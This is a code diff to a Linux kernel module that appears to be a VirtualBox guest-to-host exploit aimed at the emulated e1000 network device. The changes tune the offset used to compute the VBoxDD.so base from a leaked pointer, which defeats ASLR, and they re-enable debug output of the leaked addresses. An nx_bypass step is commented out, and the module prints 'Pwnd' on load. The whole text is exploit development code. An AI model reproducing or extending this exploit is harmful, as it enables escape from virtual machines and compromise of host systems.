@@ -21,7 +21,7 @@ MODULE_SUPPORTED_DEVICE("none");
 MODULE_LICENSE("TLS-SEC");
 
 #define NB_MAX_DESC 256
-#define LEAKED_VBOXDD_VAO 0x330D2E
+#define LEAKED_VBOXDD_VAO 0x330E00
 
 /* ========================== METHOD DECLARATION ========================== */
 static int __init e1k_init(void);
@@ -61,8 +61,7 @@ static int __init e1k_init(void)
 		return -1;
 	}
 	e1k_configure();
-	res = aslr_bypass();
-	pr_info("Leaked VBoxDD.so base : 0x%016llx\n", res);
+	aslr_bypass();
 	//nx_bypass();
 	
 	pr_info("Pwnd");
@@ -341,8 +340,8 @@ static uint64_t aslr_bypass(void)
 
 	leaked_vboxdd_ptr	= *((uint64_t *) leaked_bytes);
 	vboxdd_base			= leaked_vboxdd_ptr - LEAKED_VBOXDD_VAO;
-	//pr_info("Leaked VBoxDD.so pointer : 0x%016llx\n", leaked_vboxdd_ptr);
-	//pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);
+	pr_info("Leaked VBoxDD.so pointer : 0x%016llx\n", leaked_vboxdd_ptr);
+	pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);
 
 	return vboxdd_base;
 }
